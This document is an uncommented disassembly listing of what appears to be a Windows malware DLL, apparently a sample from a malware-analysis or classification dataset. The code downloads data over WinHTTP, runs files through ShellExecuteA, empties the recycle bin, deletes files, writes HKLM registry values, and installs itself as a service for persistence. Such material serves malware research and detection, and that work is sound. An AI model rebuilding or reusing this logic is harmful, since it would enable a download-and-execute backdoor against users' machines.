push rw-data
push ecx
jmp r-xdata
call sub_10006aaa
push eax
lea edx [ esp + 0x14c ]
push rw-data
push edx
call sub_10006aaa
shr eax 0xa
push eax
lea ecx [ esp + 0x14c ]
push rw-data
push ecx
jmp r-xdata
call sub_100076ea
add esp 0xc
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
call sub_100067c4
lea ecx [ esp + 0xc ]
push rw-data
push ecx
lea ecx [ esp + 0x18 ]
call sub_10013eda
mov eax [ eax ]
or ecx 0xffffffff
mov edi eax
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x15d ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
call sub_10014bf1
lea ecx [ esp + 0x48 ]
push 0x129
push ecx
lea ecx [ esp + 0x38 ]
call sub_100145a5
call sub_100076ea
add esp 0xc
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
call sub_100067c4
lea ecx [ esp + 0xc ]
push rw-data
push ecx
lea ecx [ esp + 0x18 ]
call sub_10013eda
mov edi [ eax ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x15d ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
call sub_10014bf1
lea ecx [ esp + 0x48 ]
push 0x129
push ecx
lea ecx [ esp + 0x38 ]
call sub_100145a5
jmp r-xdata
sub_10004680
mov eax [ esp + 0x8 ]
sub esp 0x118
push ebx
push ebp
mov ebp [ esp + 0x12c ]
push esi
push edi
mov [ eax ] 0x0
push 0x344
mov [ ebp ] 0x0
call sub_10014308
mov esi [ esp + 0x130 ]
mov ebx eax
mov ecx 0x84
xor eax eax
lea edi [ ebx + 0x134 ]
add esp 0x4
[ edi ] [ esi ]
mov edi [ esp + 0x138 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebx + 0x32 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x13c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0x244 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call sub_1001502f
test eax eax
je r-xdata
push ebx
call sub_10014331
add esp 0x4
mov [ ebp ] 0x1b5b
mov eax [ esp + 0x1c ]
push ebx
push 0x0
push sub_10004760
mov [ ebx + 0x138 ] eax
call sub_10007d6f
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x118
retn 0x14
sub_10004760
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_1001a256
push eax
mov eax 0x20468
mov [ fs : 0x0 ] esp
call sub_10007d40
mov eax [ esp + 0x20478 ]
push ebx
push ebp
push esi
push edi
mov ecx 0xd1
mov esi eax
lea edi [ esp + 0x12c ]
[ edi ] [ esi ]
push eax
call sub_10014331
add esp 0x4
lea ecx [ esp + 0x30 ]
call sub_10002160
mov al [ esp + 0x23 ]
xor ebx ebx
push ebx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20484 ] ebx
mov [ esp + 0x14 ] al
call sub_10001da0
or esi 0xffffffff
mov edi rw-data
mov ecx esi
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x1
mov ebp ecx
lea ecx [ esp + 0x14 ]
push ebp
mov [ esp + 0x20488 ] 0x1
call sub_10001e10
test al al
je r-xdata
lea ecx [ esp + 0x15e ]
push 0xbbc
lea edx [ esp + 0x130 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
lea ecx [ esp + 0x40 ]
call sub_10002440
test al al
jne r-xdata
mov edi [ esp + 0x14 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebp
or esi 0xffffffff
mov [ eax + ebp ] bl
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0xad ]
mov [ esp + 0xac ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0xac ]
push ecx
lea ecx [ esp + 0xa4 ]
stosb [ edi ]
call sub_10001840
lea edx [ esp + 0xac ]
push 0x80
push edx
lea ecx [ esp + 0x38 ]
call sub_10002d80
test al al
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x260 ]
push 0x210
push eax
lea ecx [ esp + 0x38 ]
call sub_10002d80
test al al
je r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20480 ] esi
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
lea ecx [ esp + 0x370 ]
push rw-data
push ecx
mov [ esp + 0x30 ] ebx
call sub_10008136
mov ebp eax
add esp 0x8
cmp ebp ebx
je r-xdata
lea ecx [ esp + 0x30 ]
call sub_10002300
mov ecx [ esp + 0x20478 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20474
retn
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
mov eax [ esp + 0x268 ]
cmp eax ebx
jbe r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov esi [ esp + 0x264 ]
push ebx
push eax
push ebp
call sub_1000804c
add esp 0xc
test eax eax
je r-xdata
push ebp
call sub_10007fcf
add esp 0x4
lea ecx [ esp + 0x30 ]
mov [ esp + 0x24 ] ebx
call sub_10002cf0
and eax 0xff
mov [ esp + 0x2c ] eax
je r-xdata
cmp esi 0x20000
jbe r-xdata
mov esi [ esp + 0x264 ]
mov eax [ esp + 0x268 ]
sub esi eax
mov [ esp + 0x264 ] esi
jmp r-xdata
push ebp
call sub_10007fcf
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x30 ]
call sub_10003200
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x34 ]
mov esi [ WinHttpQueryHeaders@IAT ]
lea edx [ esp + 0x24 ]
push ebx
push edx
push ebx
push ebx
push 0x16
push eax
call esi
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push ebp
push 0x1
lea edx [ esp + 0x478 ]
push esi
push edx
call sub_10007eb8
add esp 0x10
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x470 ]
push eax
push esi
push ecx
lea ecx [ esp + 0x3c ]
call sub_10002dc0
test al al
je r-xdata
mov esi 0x20000
mov ecx 0x8001
xor eax eax
lea edi [ esp + 0x471 ]
mov [ esp + 0x470 ] bl
[ edi ]
cmp esi ebx
stosw [ edi ]
jbe r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20480 ] 0xffffffff
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov ecx [ esp + 0x24 ]
shr ecx 0x1
shl ecx 0x1
push ecx
call sub_10014308
add esp 0x4
lea edx [ esp + 0x24 ]
push ebx
push edx
push eax
mov eax [ esp + 0x40 ]
push ebx
push 0x16
push eax
call esi
mov eax [ esp + 0x264 ]
mov edi [ esp + 0x28 ]
sub eax edi
push eax
push rw-data
mov [ esp + 0x26c ] eax
call sub_1000775f
mov esi [ esp + 0x26c ]
add esp 0x8
cmp esi ebx
ja r-xdata
cmp al 0xff
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_10004ad0
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov [ eax ] 0x0
push 0x344
mov [ ebp ] 0x0
call sub_10014308
mov esi [ esp + 0x18 ]
mov ebx eax
mov ecx 0x84
xor eax eax
lea edi [ ebx + 0x134 ]
add esp 0x4
[ edi ] [ esi ]
mov edi [ esp + 0x20 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebx + 0x32 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x24 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x13c ]
test eax eax
jbe r-xdata
lea eax [ ebx + 0x244 ]
push rw-data
push eax
call sub_10008136
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea ecx [ ebx + 0x244 ]
push rw-data
push ecx
call sub_10008136
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov [ ebp ] 0x1b5b
push esi
call sub_10007fcf
push ebx
push 0x0
push sub_10004bf0
call sub_10007d6f
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebx + 0x13c ]
push 0x0
push edx
push esi
call sub_1000804c
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x14
push ebx
call sub_10014331
add esp 0x4
push esi
call sub_10007fcf
add esp 0x4
mov [ ebp ] 0x1b5b
pop edi
pop esi
pop ebp
pop ebx
retn 0x14
sub_10004bf0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_1001a276
push eax
mov eax 0x2045c
mov [ fs : 0x0 ] esp
call sub_10007d40
mov eax [ esp + 0x2046c ]
push ebx
push ebp
push esi
push edi
mov ecx 0xd1
mov esi eax
lea edi [ esp + 0x120 ]
[ edi ] [ esi ]
push eax
call sub_10014331
add esp 0x4
lea ecx [ esp + 0x24 ]
call sub_10002160
mov al [ esp + 0x23 ]
xor ebx ebx
push ebx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20478 ] ebx
mov [ esp + 0x14 ] al
call sub_10001da0
or esi 0xffffffff
mov edi rw-data
mov ecx esi
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x1
mov ebp ecx
lea ecx [ esp + 0x14 ]
push ebp
mov [ esp + 0x2047c ] 0x1
call sub_10001e10
test al al
je r-xdata
lea ecx [ esp + 0x152 ]
push 0xbbd
lea edx [ esp + 0x124 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
lea ecx [ esp + 0x34 ]
call sub_10002440
test al al
jne r-xdata
mov edi [ esp + 0x14 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebp
or esi 0xffffffff
mov [ eax + ebp ] bl
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0xa1 ]
mov [ esp + 0xa0 ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0xa0 ]
push ecx
lea ecx [ esp + 0x98 ]
stosb [ edi ]
call sub_10001840
lea edx [ esp + 0xa0 ]
push 0x80
push edx
lea ecx [ esp + 0x2c ]
call sub_10002d80
test al al
je r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20478 ] bl
call sub_10001da0
mov [ esp + 0x20474 ] esi
jmp r-xdata
lea eax [ esp + 0x254 ]
push 0x210
push eax
lea ecx [ esp + 0x2c ]
call sub_10002d80
test al al
jne r-xdata
lea ecx [ esp + 0x24 ]
call sub_10002300
mov ecx [ esp + 0x2046c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20468
retn
lea ecx [ esp + 0x24 ]
call sub_10002cf0
test al al
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp [ esp + 0x25c ] ebx
jbe r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20474 ] esi
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
lea eax [ esp + 0x364 ]
push rw-data
push eax
call sub_10008136
mov ebp eax
add esp 0x8
cmp ebp ebx
jne r-xdata
lea ecx [ esp + 0x364 ]
push rw-data
push ecx
call sub_10008136
mov ebp eax
add esp 0x8
cmp ebp ebx
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
mov esi [ esp + 0x258 ]
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x25c ]
push ebx
push edx
push ebp
call sub_1000804c
add esp 0xc
test eax eax
jne r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ebp
call sub_10007fcf
add esp 0x4
lea ecx [ esp + 0x24 ]
call sub_10003200
cmp [ esp + 0x260 ] ebx
je r-xdata
cmp esi 0x20000
jbe r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ebp
call sub_10007fcf
add esp 0x4
jmp r-xdata
mov esi [ esp + 0x258 ]
mov eax [ esp + 0x25c ]
sub esi eax
mov [ esp + 0x258 ] esi
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
push 0x5
push ebx
lea eax [ esp + 0x36c ]
push ebx
push eax
push ebx
push ebx
call [ ShellExecuteA@IAT ]
lea ecx [ esp + 0x464 ]
push esi
push ecx
lea ecx [ esp + 0x2c ]
call sub_10002d20
test al al
push ebp
je r-xdata
mov esi 0x20000
cmp al 0xff
je r-xdata
mov ecx 0x8001
xor eax eax
lea edi [ esp + 0x465 ]
mov [ esp + 0x464 ] bl
[ edi ]
cmp esi ebx
stosw [ edi ]
jbe r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20474 ] 0xffffffff
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
call sub_10007fcf
add esp 0x4
jmp r-xdata
push 0x1
lea edx [ esp + 0x46c ]
push esi
push edx
call sub_10008149
mov eax [ esp + 0x268 ]
sub eax esi
push eax
push rw-data
mov [ esp + 0x270 ] eax
call sub_1000775f
mov esi [ esp + 0x270 ]
add esp 0x18
cmp esi ebx
ja r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_10004f60
sub esp 0x120
push ebp
mov [ esp + 0x4 ] ecx
push edi
mov ecx 0x46
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
xor ebp ebp
[ edi ]
mov ecx [ esp + 0x130 ]
stosw [ edi ]
stosb [ edi ]
mov eax 0xe6c2b449
mul [ ecx ]
shr edx 0x8
je r-xdata
push 0x7
push 0x0
push 0x0
call [ SHEmptyRecycleBinA@IAT ]
mov edx [ esp + 0x134 ]
mov eax [ esp + 0x130 ]
pop edi
pop ebp
mov [ edx ] 0x0
mov [ eax ] 0x0
add esp 0x120
retn 0xc
push ebx
mov ebx [ esp + 0x130 ]
push esi
mov eax [ esp + 0x10 ]
push 0x3
lea edx [ esp + 0x18 ]
push rw-data
push edx
push eax
call sub_10005040
mov ecx [ esp + 0x138 ]
mov eax 0xe6c2b449
inc ebp
add ebx 0x11c
mul [ ecx ]
shr edx 0x8
cmp ebp edx
jb r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x13 ] al
mov ecx 0x47
mov esi ebx
lea edi [ esp + 0x14 ]
xor eax eax
[ edi ] [ esi ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ esp + ecx + 0x13 ] 0x5c
jne r-xdata
pop esi
pop ebx
sub_10005040
sub esp 0x228
mov eax [ esp + 0x230 ]
push esi
mov esi [ lstrcpyA@IAT ]
push edi
lea ecx [ esp + 0x28 ]
push eax
push ecx
call esi
mov edi [ lstrlenA@IAT ]
lea edx [ esp + 0x28 ]
push edx
call edi
mov [ esp + eax + 0x29 ] 0x0
lea ecx [ esp + 0x12c ]
mov eax [ esp + 0x23c ]
push eax
push ecx
call esi
lea edx [ esp + 0x12c ]
push edx
call edi
mov [ esp + eax + 0x12d ] 0x0
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
stosw [ edi ]
mov eax [ esp + 0x240 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0x8 ]
lea edx [ esp + 0x12c ]
push eax
mov [ esp + 0xc ] 0x0
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] 0x295
call [ SHFileOperationA@IAT ]
neg eax
sbb eax eax
pop edi
inc eax
pop esi
add esp 0x228
retn 0x10
sub_10005120
push 0xffffffff
push sub_1001a288
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_10002160
lea ecx [ esi + 0x284 ]
mov [ esp + 0x10 ] 0x0
call sub_10001000
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_10005190
push 0xffffffff
push sub_1001a2a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x284 ]
mov [ esp + 0x10 ] 0x0
call sub_10001030
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_10002300
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_100051f0
push 0xffffffff
push sub_1001a2cb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
mov al [ esp + 0x3 ]
push ebx
mov [ esp + 0x8 ] al
push ebp
xor eax eax
push esi
push edi
mov ebp ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x1
mov ebx ecx
lea ecx [ esp + 0x18 ]
push ebx
mov [ esp + 0xbc ] eax
call sub_10001e10
test al al
je r-xdata
mov edx [ esp + 0xbc ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebx [ ebp + 0x80 ]
mov eax ecx
mov esi edi
mov edi ebx
mov ebx [ esp + 0xc0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push 0xbb8
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
lea esi [ ebp + 0x180 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x2c ] esi
mov esi edi
mov edi [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
push edx
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx ebp
call sub_100028b0
test al al
je r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebx
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebx
mov [ eax + ebx ] 0x0
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x2d ]
mov [ esp + 0x2c ] 0x0
[ edi ]
stosw [ edi ]
lea edx [ esp + 0x2c ]
lea ecx [ ebp + 0x284 ]
push edx
mov [ esp + 0x28 ] 0x0
stosb [ edi ]
call sub_10001840
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x2c ]
push eax
push 0x80
push ecx
mov ecx ebp
call sub_10002dc0
test al al
je r-xdata
mov ecx [ esp + 0xac ]
pop edi
pop esi
pop ebp
xor al al
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa8
retn 0x8
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx ebp
call sub_10002cf0
test al al
je r-xdata
dec ecx
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx ebp
call sub_100053a0
test al al
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx ebp
call sub_10003200
mov ecx ebp
call sub_10002c70
test al al
jne r-xdata
sub_100053a0
sub esp 0x8
xor eax eax
push esi
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push 0x8
mov esi ecx
push eax
call sub_10002d20
test al al
jne r-xdata
mov ecx [ esp + 0x4 ]
lea eax [ ecx - 0x404 ]
cmp eax 0xb
ja r-xdata
pop esi
add esp 0x8
retn
mov al 0x1
pop esi
add esp 0x8
retn
xor edx edx
mov dl [ eax + lookup_table_1000540c ]
jmp [ edx * 4 + jump_table_10005400 ]
mov ecx esi
call sub_100055f0
mov al 0x1
pop esi
add esp 0x8
retn
push ecx
mov ecx esi
call sub_10005420
sub_10005440
push 0xffffffff
push sub_1001a301
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb8
mov al [ esp + 0x3 ]
push ebx
push ebp
xor ebx ebx
push esi
push edi
mov [ esp + 0x14 ] al
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov esi [ esp + 0xd8 ]
mov [ esp + 0xd0 ] ebx
mov eax [ esi + 0x7c ]
cmp eax 0x405
jne r-xdata
cmp eax 0x409
jne r-xdata
lea ecx [ esp + 0x24 ]
call sub_10003ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov [ esp + 0xd4 ] 0x1
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
call sub_10001e10
test al al
je r-xdata
mov ecx [ esp + 0xc8 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xc4
retn
lea ecx [ esp + 0x24 ]
call sub_10005fa0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov [ esp + 0xd4 ] 0x2
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
call sub_10001e10
test al al
je r-xdata
lea ecx [ esi + 0x180 ]
add esi 0x80
push ecx
lea edx [ esp + 0x18 ]
push esi
push edx
lea ecx [ esp + 0x30 ]
call sub_10003d30
lea ecx [ esp + 0x24 ]
mov [ esp + 0xd0 ] bl
call sub_10003d20
jmp r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov esi [ esp + 0xd8 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
lea edx [ esi + 0x180 ]
add esi 0x80
push edx
lea eax [ esp + 0x18 ]
push esi
push eax
lea ecx [ esp + 0x30 ]
call sub_10006030
lea ecx [ esp + 0x24 ]
mov [ esp + 0xd0 ] bl
call sub_10006020
mov edi [ esp + 0x18 ]
mov ecx ebp
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0xd8 ]
mov [ esp + 0x1c ] ebp
mov [ ecx + ebp ] bl
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_100055f0
sub esp 0x14
push ebx
push esi
lea eax [ esp + 0x14 ]
push 0x8
mov ebx ecx
push eax
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] 0x0
call sub_10002d20
test al al
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
lea eax [ esp + 0x8 ]
push 0x0
push eax
push 0x0
push 0x2
push 0x0
push 0x0
push 0x0
push rw-data
push 0x80000002
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] edx
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop esi
pop ebx
add esp 0x14
retn
mov edx [ esp + 0x8 ]
mov esi [ RegSetValueExA@IAT ]
lea ecx [ esp + 0xc ]
push 0x4
push ecx
push 0x4
push 0x0
push rw-data
push edx
call esi
test eax eax
je r-xdata
pop esi
xor al al
pop ebx
add esp 0x14
retn
mov edx [ esp + 0x8 ]
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x4
push 0x0
push rw-data
push edx
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
xor al al
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x8 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx ebx
call sub_10003200
pop esi
mov al 0x1
pop ebx
add esp 0x14
retn
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
xor al al
pop ebx
add esp 0x14
retn
ServiceMain
sub esp 0x100
lea ecx [ esp ]
push esi
mov esi [ esp + 0x10c ]
push 0x100
mov eax [ esi ]
push eax
push ecx
call sub_10007bc0
mov edx [ esi ]
push 0x100
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_10008282
mov edx [ esp + 0x120 ]
lea ecx [ esp + 0x1c ]
push ecx
push edx
push rw-data
call sub_10005e80
add esp 0x24
lea eax [ esp + 0x4 ]
push sub_10005870
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call [ FreeConsole@IAT ]
push 0x1
push 0x0
push 0x2
call sub_10005810
push 0x0
push 0x0
push 0x4
call sub_10005810
add esp 0x18
call sub_10005f60
mov esi [ Sleep@IAT ]
mov ecx [ esi ]
push ecx
push rw-data
call sub_10005e80
add esp 0x8
pop esi
add esp 0x100
retn 0x8
push rw-data
call sub_10005e80
add esp 0x4
pop esi
add esp 0x100
retn 0x8
cmp eax 0x1
jne r-xdata
push 0xa
call esi
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_10005810
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10005870
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10005940 ]
push 0x1
push 0x0
push 0x3
call sub_10005810
push rw-data
call sub_10005e80
add esp 0x10
push 0xa
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10005810
add esp 0xc
retn 0x4
push 0x1
push 0x0
push 0x6
call sub_10005810
push rw-data
call sub_10005e80
push 0x0
push 0x0
push 0x7
call sub_10005810
add esp 0x1c
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_10005810
push rw-data
call sub_10005e80
push 0x0
push 0x0
push 0x4
call sub_10005810
add esp 0x1c
retn 0x4
push rw-data
call sub_10005e80
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_10005810
add esp 0x10
retn 0x4
push rw-data
call sub_10005e80
push 0x0
push 0x0
push 0x1
call sub_10005810
add esp 0x10
InstallService
push ebp
mov ebp esp
push 0xffffffff
push sub_1001a310
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x23c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
mov edi rw-data
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] edi
je r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push ecx
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x248 ]
push eax
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x50 ]
push ecx
push edx
